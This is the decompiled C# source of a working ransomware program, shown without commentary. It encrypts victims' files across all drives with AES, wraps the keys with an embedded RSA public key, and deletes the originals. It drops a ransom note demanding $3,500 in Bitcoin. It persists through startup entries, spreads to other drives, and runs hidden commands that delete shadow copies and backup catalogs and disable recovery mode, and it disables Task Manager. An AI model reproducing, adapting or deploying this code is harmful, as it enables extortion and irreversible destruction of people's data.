KKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigD//Z";

	public static string appMutexStartup = "1qw0ll8p9m8uezhqhyd";

	private static string droppedMessageTextbox = "read_it.txt";

	private static bool checkAdminPrivilage = true;

	private static bool checkdeleteShadowCopies = true;

	private static bool checkdisableRecoveryMode = true;

	private static bool checkdeleteBackupCatalog = true;

	private static bool disableTaskManager = true;

	public static string appMutexStartup2 = "17CqMQFeuB3NTzJ";

	public static string appMutex2 = appMutexStartup2 + appMutexRun2;

	public static string staticSplit = "bc";

	public static string appMutex = staticSplit + appMutexStartup + appMutexRun;

	public static readonly Regex appMutexRegex = new Regex("(?:[13]{1}[a-km-zA-HJ-NP-Z1-9]{26,33}|bc1[a-z0-9]{39,59})");

	private static List<string> messages = new List<string> { "All your files are encrypted", "", "Your computer is infected with a ransomware virus. Your files have been encrypted and you will be able to decrypt them without our help. What can I do to get my files back? You can purchase our special package.", "This software will help you recover all your data and delete the ransomware from your computer. The price of the software is $3,500. Payment can only be made with Bitcoin.", "", "contact us", "", "mail : anontengri@proton.me" };

	private static string[] validExtensions = new string[231]
	{
		".txt", ".jar", ".dat", ".contact", ".settings", ".doc", ".docx", ".xls", ".xlsx", ".ppt",
		".pptx", ".odt", ".jpg", ".mka", ".mhtml", ".oqy", ".png", ".csv", ".py", ".sql",
		".mdb", ".php", ".asp", ".aspx", ".html", ".htm", ".xml", ".psd", ".pdf", ".xla",
		".cub", ".dae", ".indd", ".cs", ".mp3", ".mp4", ".dwg", ".zip", ".rar", ".mov",
		".rtf", ".bmp", ".mkv", ".avi", ".apk", ".lnk", ".dib", ".dic", ".dif", ".divx",
		".iso", ".7zip", ".ace", ".arj", ".bz2", ".cab", ".gzip", ".lzh", ".tar", ".jpeg",
		".xz", ".mpeg", ".torrent", ".mpg", ".core", ".pdb", ".ico", ".pas", ".db", ".wmv",
		".swf", ".cer", ".bak", ".backup", ".accdb", ".bay", ".p7c", ".exif", ".vss", ".raw",
		".m4a", ".wma", ".flv", ".sie", ".sum", ".ibank", ".wallet", ".css", ".js", ".rb",
		".crt", ".xlsm", ".xlsb", ".7z", ".cpp", ".java", ".jpe", ".ini", ".blob", ".wps",
		".docm", ".wav", ".3gp", ".webm", ".m4v", ".amv", ".m4p", ".svg", ".ods", ".bk",
		".vdi", ".vmdk", ".onepkg", ".accde", ".jsp", ".json", ".gif", ".log", ".gz", ".config",
		".vb", ".m1v", ".sln", ".pst", ".obj", ".xlam", ".djvu", ".inc", ".cvs", ".dbf",
		".tbi", ".wpd", ".dot", ".dotx", ".xltx", ".pptm", ".potx", ".potm", ".pot", ".xlw",
		".xps", ".xsd", ".xsf", ".xsl", ".kmz", ".accdr", ".stm", ".accdt", ".ppam", ".pps",
		".ppsm", ".1cd", ".3ds", ".3fr", ".3g2", ".accda", ".accdc", ".accdw", ".adp", ".ai",
		".ai3", ".ai4", ".ai5", ".ai6", ".ai7", ".ai8", ".arw", ".ascx", ".asm", ".asmx",
		".avs", ".bin", ".cfm", ".dbx", ".dcm", ".dcr", ".pict", ".rgbe", ".dwt", ".f4v",
		".exr", ".kwm", ".max", ".mda", ".mde", ".mdf", ".mdw", ".mht", ".mpv", ".msg",
		".myi", ".nef", ".odc", ".geo", ".swift", ".odm", ".odp", ".oft", ".orf", ".pfx",
		".p12", ".pl", ".pls", ".safe", ".tab", ".vbs", ".xlk", ".xlm", ".xlt", ".xltm",
		".svgz", ".slk", ".tar.gz", ".dmg", ".ps", ".psb", ".tif", ".rss", ".key", ".vob",
		".epsp", ".dc3", ".iff", ".onepkg", ".onetoc2", ".opt", ".p7b", ".pam", ".r3d", ".docx",
		".xlsx"
	};

	private static Random random = new Random();

	[DllImport("user32.dll", CharSet = CharSet.Auto)]
	private static extern int SystemParametersInfo(uint action, uint uParam, string vParam, uint winIni);

	private static void Main(string[] args)
	{
		if (isOver())
		{
			new Thread((ThreadStart)delegate
			{
				Run();
			}).Start();
			return;
		}
		if (AlreadyRunning())
		{
			Environment.Exit(1);
		}
		if (checkSleep)
		{
			sleepOutOfTempFolder();
		}
		if (checkAdminPrivilage)
		{
			copyResistForAdmin(processName);
		}
		else if (checkCopyRoaming)
		{
			copyRoaming(processName);
		}
		if (checkStartupFolder)
		{
			addLinkToStartup();
		}
		if (checkAdminPrivilage)
		{
			if (checkdeleteShadowCopies)
			{
				deleteShadowCopies();
			}
			if (checkdisableRecoveryMode)
			{
				disableRecoveryMode();
			}
			if (checkdeleteBackupCatalog)
			{
				deleteBackupCatalog();
			}
			if (disableTaskManager)
			{
				DisableTaskManager();
			}
		}
		lookForDirectories();
		if (checkSpread)
		{
			spreadIt(spreadName);
		}
		addAndOpenNote();
		SetWallpaper(base64Image);
		new Thread((ThreadStart)delegate
		{
			Run();
		}).Start();
	}

	public static void Run()
	{
		Application.Run((Form)(object)new driveNotification.NotificationForm());
	}

	private static void sleepOutOfTempFolder()
	{
		string directoryName = Path.GetDirectoryName(Assembly.GetEntryAssembly().Location);
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
		if (directoryName != folderPath)
		{
			Thread.Sleep(sleepTextbox * 1000);
		}
	}

	private static bool AlreadyRunning()
	{
		Process[] processes = Process.GetProcesses();
		Process currentProcess = Process.GetCurrentProcess();
		Process[] array = processes;
		foreach (Process process in array)
		{
			try
			{
				if (process.Modules[0].FileName == Assembly.GetExecutingAssembly().Location && currentProcess.Id != process.Id)
				{
					return true;
				}
			}
			catch (Exception)
			{
			}
		}
		return false;
	}

	public static string RandomString(int length)
	{
		StringBuilder stringBuilder = new StringBuilder();
		for (int i = 0; i < length; i++)
		{
			char value = "abcdefghijklmnopqrstuvwxyz0123456789"[random.Next(0, "abcdefghijklmnopqrstuvwxyz0123456789".Length)];
			stringBuilder.Append(value);
		}
		return stringBuilder.ToString();
	}

	public static string RandomStringForExtension(int length)
	{
		if (encryptedFileExtension == "")
		{
			StringBuilder stringBuilder = new StringBuilder();
			for (int i = 0; i < length; i++)
			{
				char value = "abcdefghijklmnopqrstuvwxyz0123456789"[random.Next(0, "abcdefghijklmnopqrstuvwxyz0123456789".Length)];
				stringBuilder.Append(value);
			}
			return stringBuilder.ToString();
		}
		return encryptedFileExtension;
	}

	public static string Base64EncodeString(string plainText)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(plainText);
		return Convert.ToBase64String(bytes);
	}

	private static void encryptDirectory(string location)
	{
		try
		{
			string[] files = Directory.GetFiles(location);
			bool flag = true;
			for (int i = 0; i < files.Length; i++)
			{
				try
				{
					string extension = Path.GetExtension(files[i]);
					string fileName = Path.GetFileName(files[i]);
					if (!Array.Exists(validExtensions, (string E) => E == extension.ToLower()) || !(fileName != droppedMessageTextbox))
					{
						continue;
					}
					FileInfo fileInfo = new FileInfo(files[i]);
					try
					{
						fileInfo.Attributes = FileAttributes.Normal;
					}
					catch
					{
					}
					string text = CreatePassword(40);
					if (fileInfo.Length < 1368709120)
					{
						if (checkDirContains(files[i]))
						{
							string keyRSA = RSA_Encrypt(text, rsaKey());
							AES_Encrypt(files[i], text, keyRSA);
						}
					}
					else
					{
						AES_Encrypt_Large(files[i], text, fileInfo.Length);
					}
					if (flag)
					{
						flag = false;
						string path = location + "/" + droppedMessageTextbox;
						string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.CommonDesktopDirectory);
						if (!File.Exists(path) && location != folderPath)
						{
							File.WriteAllLines(path, messages);
						}
					}
				}
				catch (Exception)
				{
				}
			}
			string[] directories = Directory.GetDirectories(location);
			for (int j = 0; j < directories.Length; j++)
			{
				try
				{
					new DirectoryInfo(directories[j]).Attributes &= ~FileAttributes.Normal;
				}
				catch
				{
				}
				encryptDirectory(directories[j]);
			}
		}
		catch (Exception)
		{
		}
	}

	private static bool checkDirContains(string directory)
	{
		directory = directory.ToLower();
		string[] array = new string[16]
		{
			"appdata\\local", "appdata\\locallow", "users\\all users", "\\ProgramData", "boot.ini", "bootfont.bin", "boot.ini", "iconcache.db", "ntuser.dat", "ntuser.dat.log",
			"ntuser.ini", "thumbs.db", "autorun.inf", "bootsect.bak", "bootmgfw.efi", "desktop.ini"
		};
		string[] array2 = array;
		foreach (string value in array2)
		{
			if (directory.Contains(value))
			{
				return false;
			}
		}
		return true;
	}

	public static string rsaKey()
	{
		StringBuilder stringBuilder = new StringBuilder();
		stringBuilder.AppendLine("<?xml version=\"1.0\" encoding=\"utf-16\"?>");
		stringBuilder.AppendLine("<RSAParameters xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\">");
		stringBuilder.AppendLine("  <Exponent>AQAB</Exponent>");
		stringBuilder.AppendLine("  <Modulus>xuauFvolHmUtNkv57veNaut/1BTSJ3YU4xOVThXiIp23UB5CDqV5GJhTaOl7A5Kmd4dVauylJSc2Xzi4QaYX4mZpIzI4/3+olGp1asMQ9CFLreu//mbT6VRTbEd2antvUOPB0YeI3IuoLimtKoPgs3/PsQbsICQi7kzbb5iWdPG4UHBLBzYr6M3GKdOjhCq+mHw1IoghIRa4uOJY5Zo6zVKI3Lt1dT0CQJCpQeTa6zv1Y76lAaMjpCc4TeomRWUxqis/Ded+PdpUCIOL2U8bX/+wNyteW5iHEtWKiNg5MX3Kc/iT2Ojq+Ie3/Jvrv/3CwZDAkg1i0dlS1oi8F2dpVQ==</Modulus>");
		stringBuilder.AppendLine("</RSAParameters>");
		return stringBuilder.ToString();
	}

	public static string CreatePassword(int length)
	{
		StringBuilder stringBuilder = new StringBuilder();
		Random random = new Random();
		while (0 < length--)
		{
			stringBuilder.Append("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/"[random.Next("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/".Length)]);
		}
		return stringBuilder.ToString();
	}

	private static void AES_Encrypt(string inputFile, string password, string keyRSA)
	{
		string path = inputFile + "." + RandomStringForExtension(4);
		byte[] array = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
		FileStream fileStream = new FileStream(path, FileMode.Create);
		byte[] bytes = Encoding.UTF8.GetBytes(password);
		RijndaelManaged rijndaelManaged = new RijndaelManaged();
		rijndaelManaged.KeySize = 256;
		rijndaelManaged.BlockSize = 128;
		rijndaelManaged.Padding = PaddingMode.PKCS7;
		Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(bytes, array, 1);
		rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
		rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
		rijndaelManaged.Mode = CipherMode.CFB;
		fileStream.Write(array, 0, array.Length);
		CryptoStream cryptoStream = new CryptoStream(fileStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write);
		FileStream fileStream2 = new FileStream(inputFile, FileMode.Open);
		fileStream2.CopyTo(cryptoStream);
		fileStream2.Flush();
		fileStream2.Close();
		cryptoStream.Flush();
		cryptoStream.Close();
		fileStream.Close();
		using (FileStream stream = new FileStream(path, FileMode.Append, FileAccess.Write))
		{
			using StreamWriter streamWriter = new StreamWriter(stream);
			streamWriter.Write(keyRSA);
			streamWriter.Flush();
			streamWriter.Close();
		}
		File.WriteAllText(inputFile, "?");
		File.Delete(inputFile);
	}

	private static void AES_Encrypt_Small(string inputFile, string passwordBytes)
	{
		byte[] bytes = Encoding.ASCII.GetBytes(passwordBytes);
		byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
		FileStream stream = new FileStream(inputFile + "." + RandomStringForExtension(4), FileMode.Create);
		RijndaelManaged rijndaelManaged = new RijndaelManaged();
		rijndaelManaged.KeySize = 256;
		rijndaelManaged.BlockSize = 128;
		Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(bytes, salt, 1000);
		rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
		rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
		rijndaelManaged.Padding = PaddingMode.Zeros;
		rijndaelManaged.Mode = CipherMode.CBC;
		using (CryptoStream cryptoStream = new CryptoStream(stream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write))
		{
			FileStream fileStream = new FileStream(inputFile, FileMode.Open);
			fileStream.CopyTo(cryptoStream);
			fileStream.Flush();
			cryptoStream.Flush();
			fileStream.Close();
			cryptoStream.Close();
		}
		File.WriteAllText(inputFile, "?");
		File.Delete(inputFile);
	}

	private static void AES_Encrypt_Large(string inputFile, string password, long lenghtBytes)
	{
		GenerateRandomSalt();
		using FileStream fileStream = new FileStream(inputFile + "." + RandomStringForExtension(4), FileMode.Create, FileAccess.Write, FileShare.None);
		fileStream.SetLength(lenghtBytes);
		File.WriteAllText(inputFile, "?");
		File.Delete(inputFile);
	}

	public static byte[] GenerateRandomSalt()
	{
		byte[] array = new byte[32];
		using RNGCryptoServiceProvider rNGCryptoServiceProvider = new RNGCryptoServiceProvider();
		for (int i = 0; i < 10; i++)
		{
			rNGCryptoServiceProvider.GetBytes(array);
		}
		return array;
	}

	public static string RSA_Encrypt(string textToEncrypt, string publicKeyString)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(textToEncrypt);
		using RSACryptoServiceProvider rSACryptoServiceProvider = new RSACryptoServiceProvider(2048);
		try
		{
			rSACryptoServiceProvider.FromXmlString(publicKeyString.ToString());
			byte[] inArray = rSACryptoServiceProvider.Encrypt(bytes, fOAEP: true);
			return Convert.ToBase64String(inArray);
		}
		finally
		{
			rSACryptoServiceProvider.PersistKeyInCsp = false;
		}
	}

	private static void lookForDirectories()
	{
		DriveInfo[] drives = DriveInfo.GetDrives();
		foreach (DriveInfo driveInfo in drives)
		{
			string pathRoot = Path.GetPathRoot(Environment.SystemDirectory);
			if (driveInfo.ToString() == pathRoot)
			{
				string[] array = new string[12]
				{
					"Program Files", "Program Files (x86)", "Windows", "$Recycle.Bin", "MSOCache", "Documents and Settings", "Intel", "PerfLogs", "Windows.old", "AMD",
					"NVIDIA", "ProgramData"
				};
				string[] directories = Directory.GetDirectories(pathRoot);
				for (int j = 0; j < directories.Length; j++)
				{
					DirectoryInfo directoryInfo = new DirectoryInfo(directories[j]);
					string dirName = directoryInfo.Name;
					if (!Array.Exists(array, (string E) => E == dirName))
					{
						encryptDirectory(directories[j]);
					}
				}
			}
			else
			{
				encryptDirectory(driveInfo.ToString());
			}
		}
	}

	private static void copyRoaming(string processName)
	{
		string friendlyName = AppDomain.CurrentDomain.FriendlyName;
		string location = Assembly.GetExecutingAssembly().Location;
		_ = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + friendlyName;
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\";
		string text2 = text + processName;
		if (!(friendlyName != processName) && !(location != text2))
		{
			return;
		}
		if (!File.Exists(text2))
		{
			File.Copy(friendlyName, text2);
			ProcessStartInfo processStartInfo = new ProcessStartInfo(text2);
			processStartInfo.WorkingDirectory = text;
			Process process = new Process();
			process.StartInfo = processStartInfo;
			if (process.Start())
			{
				Environment.Exit(1);
			}
			return;
		}
		try
		{
			File.Delete(text2);
			Thread.Sleep(200);
			File.Copy(friendlyName, text2);
		}
		catch
		{
		}
		ProcessStartInfo processStartInfo2 = new ProcessStartInfo(text2);
		processStartInfo2.WorkingDirectory = text;
		Process process2 = new Process();
		process2.StartInfo = processStartInfo2;
		if (process2.Start())
		{
			Environment.Exit(1);
		}
	}

	private static void copyResistForAdmin(string processName)
	{
		string friendlyName = AppDomain.CurrentDomain.FriendlyName;
		string location = Assembly.GetExecutingAssembly().Location;
		_ = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + friendlyName;
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\";
		string text2 = text + processName;
		ProcessStartInfo processStartInfo = new ProcessStartInfo(text2);
		processStartInfo.UseShellExecute = true;
		processStartInfo.Verb = "runas";
		processStartInfo.WindowStyle = ProcessWindowStyle.Normal;
		processStartInfo.WorkingDirectory = text;
		ProcessStartInfo startInfo = processStartInfo;
		Process process = new Process();
		process.StartInfo = startInfo;
		if (!(friendlyName != processName) && !(location != text2))
		{
			return;
		}
		if (!File.Exists(text2))
		{
			File.Copy(friendlyName, text2);
			try
			{
				Process.Start(startInfo);
				Environment.Exit(1);
				return;
			}
			catch (Win32Exception ex)
			{
				if (ex.NativeErrorCode == 1223)
				{
					copyResistForAdmin(processName);
				}
				return;
			}
		}
		try
		{
			File.Delete(text2);
			Thread.Sleep(200);
			File.Copy(friendlyName, text2);
		}
		catch
		{
		}
		try
		{
			Process.Start(startInfo);
			Environment.Exit(1);
		}
		catch (Win32Exception ex2)
		{
			if (ex2.NativeErrorCode == 1223)
			{
				copyResistForAdmin(processName);
			}
		}
	}

	private static void addLinkToStartup()
	{
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
		string text = Process.GetCurrentProcess().ProcessName;
		using StreamWriter streamWriter = new StreamWriter(folderPath + "\\" + text + ".url");
		string location = Assembly.GetExecutingAssembly().Location;
		streamWriter.WriteLine("[InternetShortcut]");
		streamWriter.WriteLine("URL=file:///" + location);
		streamWriter.WriteLine("IconIndex=0");
		string text2 = location.Replace('\\', '/');
		streamWriter.WriteLine("IconFile=" + text2);
	}

	private static void addAndOpenNote()
	{
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + droppedMessageTextbox;
		try
		{
			if (!File.Exists(text))
			{
				File.WriteAllLines(text, messages);
			}
			Thread.Sleep(500);
			Process.Start(text);
		}
		catch
		{
		}
	}

	private static bool isOver()
	{
		string location = Assembly.GetExecutingAssembly().Location;
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + processName;
		string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + droppedMessageTextbox;
		if (location != text)
		{
			try
			{
				File.Delete(path);
			}
			catch
			{
			}
		}
		if (File.Exists(path) && location == text)
		{
			return true;
		}
		return false;
	}

	private static void registryStartup()
	{
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
			registryKey.SetValue("Microsoft Store", Assembly.GetExecutingAssembly().Location);
		}
		catch
		{
		}
	}

	private static void spreadIt(string spreadName)
	{
		DriveInfo[] drives = DriveInfo.GetDrives();
		foreach (DriveInfo driveInfo in drives)
		{
			if (driveInfo.ToString() != Path.GetPathRoot(Environment.SystemDirectory) && !File.Exists(driveInfo.ToString() + spreadName))
			{
				try
				{
					File.Copy(Assembly.GetExecutingAssembly().Location, driveInfo.ToString() + spreadName);
				}
				catch
				{
				}
			}
		}
	}

	private static void runCommand(string commands)
	{
		Process process = new Process();
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.FileName = "cmd.exe";
		processStartInfo.Arguments = "/C " + commands;
		processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		process.StartInfo = processStartInfo;
		process.Start();
		process.WaitForExit();
	}

	private static void deleteShadowCopies()
	{
		runCommand("vssadmin delete shadows /all /quiet & wmic shadowcopy delete");
	}

	private static void disableRecoveryMode()
	{
		runCommand("bcdedit /set {default} bootstatuspolicy ignoreallfailures & bcdedit /set {default} recoveryenabled no");
	}

	private static void deleteBackupCatalog()
	{
		runCommand("wbadmin delete catalog -quiet");
	}

	public static void DisableTaskManager()
	{
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
			registryKey.SetValue("DisableTaskMgr", "1");
			registryKey.Close();
		}
		catch
		{
		}
	}

	public static void SetWallpaper(string base64)
	{
		if (base64 != "")
		{
			try
			{
				string text = Path.GetTempPath() + RandomString(9) + ".jpg";
				File.WriteAllBytes(text, Convert.FromBase64String(base64));
				SystemParametersInfo(20u, 0u, text, 3u);
			}
			catch
			{
			}
		}
	}
}
